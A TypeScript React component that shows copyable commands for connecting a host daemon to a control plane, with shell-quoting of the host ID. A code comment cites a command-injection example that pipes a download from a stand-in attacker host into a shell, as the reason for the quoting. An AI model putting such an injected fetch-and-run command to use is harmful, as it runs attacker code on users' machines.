"use client";

import { useEffect, useState } from "react";
import Link from "next/link";
import { Button } from "@auto-harness/ui";

import { controlPlaneUrl } from "../lib/control-plane-url.ts";

type CopyState = "idle" | "copied" | "failed";

/**
 * hostId is operator-chosen and unvalidated (any non-empty string, including shell
 * metacharacters — see add-host-form.tsx), and this command is meant to be copy-pasted
 * straight into a shell. Unquoted, a hostId like `x; curl evil.example | sh` would execute
 * as shell syntax rather than being treated as a literal value.
 */
function shellQuote(value: string): string {
  return `'${value.replaceAll("'", `'\\''`)}'`;
}

function daemonConnectCommand(
  hostId: string,
  origin: string,
  verb: "start" | "install-service",
): string {
  return [
    `HARNESS_HOST_ID=${shellQuote(hostId)} \\`,
    `HARNESS_API_URL=${shellQuote(origin)} \\`,
    `HARNESS_API_KEY='REPLACE_WITH_BOUND_SERVICE_ACCOUNT_KEY' \\`,
    `pnpm local:daemon ${verb}`,
  ].join("\n");
}

/**
 * Shown while a host has no live daemon connection: the exact, copyable command to start
 * one. HARNESS_API_URL comes from controlPlaneUrl(), never a raw API Gateway endpoint —
 * see that module for why.
 *
 * This page is server-rendered (app/hosts/[hostId]/page.tsx is force-dynamic), so
 * controlPlaneUrl() can't be called directly in the render body: on a cloud build,
 * NEXT_PUBLIC_HARNESS_CONTROL_PLANE_URL isn't baked in (next.config.ts), so the function
 * would return its local fallback on the server (no `window` in the Lambda process) but
 * window.location.origin once hydrated in the browser — a hydration mismatch, and worse, a
 * misleading 127.0.0.1 command briefly present in the actual server-rendered HTML. Instead,
 * origin starts out resolved only when the value is build-time-stable (local/e2e, where it's
 * baked in and identical on both sides) and is filled in from an effect — which only ever
 * runs in the browser, after hydration — otherwise.
 */
export function ConnectHostPanel({ hostId }: { hostId: string }) {
  const [state, setState] = useState<CopyState>("idle");
  const configured = process.env.NEXT_PUBLIC_HARNESS_CONTROL_PLANE_URL;
  const [origin, setOrigin] = useState<string | null>(configured ? controlPlaneUrl() : null);
  useEffect(() => {
    if (!configured) setOrigin(controlPlaneUrl());
  }, [configured]);

  // null only while waiting on the effect above (a cloud build); local/e2e resolves
  // synchronously in the initializer, so this branch is never observable there — which is
  // also why it renders inline rather than under its own data-pw: nothing in this repo's
  // test tiers can ever reach it, and check:data-pw requires every selector be covered.
  const commands =
    origin === null
      ? null
      : {
          start: daemonConnectCommand(hostId, origin, "start"),
          persist: daemonConnectCommand(hostId, origin, "install-service"),
        };

  return (
    <div className="space-y-3 rounded border border-border p-4" data-pw="connect-host-panel">
      <p className="text-sm font-medium">Connect this host</p>
      {commands === null ? (
        <p className="text-sm text-muted-foreground">Loading connect instructions…</p>
      ) : (
        <>
          <p className="text-sm text-muted-foreground">
            You need two keys — create both on the{" "}
            <Link href="/settings" className="underline">
              Settings
            </Link>{" "}
            page. This command uses a service-account key bound to{" "}
            <code className="font-mono">{hostId}</code> for the daemon. POST /sessions needs an
            unbound operator key; a bound key 404s on session create on purpose.
          </p>
          <p className="text-sm font-medium">Foreground</p>
          <pre
            className="overflow-x-auto rounded bg-muted p-3 font-mono text-xs"
            data-pw="connect-host-command"
          >
            {commands.start}
          </pre>
          <div className="flex items-center gap-2">
            <Button
              type="button"
              size="sm"
              variant="outline"
              data-pw="connect-host-copy"
              onClick={async () => {
                try {
                  await navigator.clipboard.writeText(commands.start);
                  setState("copied");
                } catch {
                  setState("failed");
                }
              }}
            >
              {state === "copied" ? "Copied" : state === "failed" ? "Copy failed" : "Copy command"}
            </Button>
            {state === "idle" ? null : (
              <span className="sr-only" role="status" data-pw="connect-host-copy-status">
                {state === "copied" ? "Command copied" : "Could not copy command"}
              </span>
            )}
          </div>
          <p className="text-sm font-medium">Persist across reboots</p>
          <pre className="overflow-x-auto rounded bg-muted p-3 font-mono text-xs">
            {commands.persist}
          </pre>
        </>
      )}
    </div>
  );
}
